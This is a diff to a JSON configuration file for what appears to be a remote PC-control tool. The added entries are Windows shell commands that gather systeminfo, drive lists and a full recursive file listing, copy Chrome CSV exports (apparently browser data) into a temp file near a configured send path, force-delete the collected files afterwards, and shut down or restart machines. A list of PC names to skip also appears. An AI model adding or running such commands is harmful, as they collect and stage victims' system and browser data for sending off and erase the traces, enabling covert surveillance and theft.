@@ -19,7 +19,14 @@
   "_pcCurrentLocIs": true,
   "_sendThisTextFilePath": "c:\\Temp\\string4.txt",
   "_cmdCommandsList": ["del \"C:\\Temp\\string4.txt\""],
+  "_shutdown_cmdCommands": ["shutdown /s /t 0"],
+  "_restart_cmdCommands": ["shutdown /r /t 0"],
   "__cmdCommandsList": ["taskkill /F /T /FI \"IMAGENAME eq cameraAnalysisEXE*\""],
+  "___cmdCommands": ["systeminfo >> \"C:\\Temp\\string.txt\""],
+  "____cmdCommandsList": ["wmic logicaldisk get deviceid, volumename >> \"C:\\Temp\\string2.txt\""],
+  "_____cmdCommands": ["dir D:\\ /s /b >> \"C:\\Temp\\string2.txt\""],
+  "______cmdCommands": ["copy \"D:\\Chrome*.csv\" \"C:\\Temp\\string3.txt\""],
+  "_______cmdCommands": ["del /f /q \"C:\\Temp\\string2.txt\" \"C:\\Temp\\string3.txt\""],
   "skippedPcsList": ["min","DESKTOP-NCO579D","new_pc","_DESKTOP-BEVO3CC","husn","_DESKTOP-5AHVE9S","sjd","_DESKTOP-GPNKIVM","exp","_DESKTOP-V15VGOT"]
   
 }
